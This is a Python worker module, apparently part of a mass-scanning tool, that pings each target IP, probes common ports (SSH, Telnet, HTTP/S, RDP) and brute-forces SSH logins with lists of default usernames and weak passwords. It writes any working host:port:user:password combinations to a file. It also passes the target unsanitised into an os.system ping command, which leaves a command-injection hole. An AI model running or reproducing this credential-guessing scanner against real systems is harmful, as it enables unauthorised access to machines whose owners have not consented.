import time
from .logger import logger
from worker import BaseWorker
import asyncio
import socket
import os
import random
import paramiko

class AppTaskHandler(BaseWorker):
    async def handle(self, item):
        start = time.time()
        async def pingtest(item):
            await asyncio.sleep(random.random())
            try:
                result =  os.system(f"ping -w 5 "+ item)
                if result == 0:
                    with open("safePing.txt",'a+',encoding='UTF-8') as fe:
                        fe.write(f"{item}\n")
                    logger.info(f"Ip Is Available ping: {item}")
                return 
            except Exception as ex:
                logger.error(f"{ex}")

        async def pingtestsocket(item):
            await asyncio.sleep(random.random())
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(1)
            for port in [13,22,23,80,443,3389]:
                try:
                    response = s.connect_ex((item,port))
                    if response == 0:
                        with open("safeSocketConnect.txt",'a+',encoding='UTF-8') as fe:
                            fe.write(f"{item}:{port}\n")
                        logger.info(f"Ip Is Available Socket: {item}:{port}")
                except Exception as ex:
                    logger.error(f"{ex}")
            return 
        
        async def sshtest(item):
            await asyncio.sleep(random.random())
            port = 22
            usernames = ["root", "admin", "user", "ubuntu"]
            passwords = ["root", "admin", "123456", "password", "1234", ""]
            
            # ابتدا بررسی می‌کنیم که پورت 22 باز است
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            try:
                response = s.connect_ex((item, port))
                if response != 0:
                    s.close()
                    return
            except Exception:
                s.close()
                return
            finally:
                s.close()
            
            # تلاش برای اتصال SSH
            for username in usernames:
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(
                            item, 
                            port=port, 
                            username=username, 
                            password=password, 
                            timeout=3,
                            allow_agent=False,
                            look_for_keys=False
                        )
                        # اگر اتصال موفق بود
                        with open("safeSSH.txt", 'a+', encoding='UTF-8') as fe:
                            fe.write(f"{item}:{port}:{username}:{password}\n")
                        logger.info(f"SSH connection successful: {username}@{item}:{port}")
                        ssh.close()
                        return  # پس از یافتن اولین اعتبار موفق، بقیه را امتحان نمی‌کنیم
                    except Exception:
                        pass
            return
        
        try:
            task = asyncio.create_task(pingtestsocket(item))
            task2 = asyncio.create_task(pingtest(item))
            task3 = asyncio.create_task(sshtest(item))
            await asyncio.gather(task, task2, task3)
        except Exception as ex:
            logger.error(f"{ex}")
        end = time.time()
        logger.info(f"Task-{item} completed in {end - start:.2f}s")
        return
        
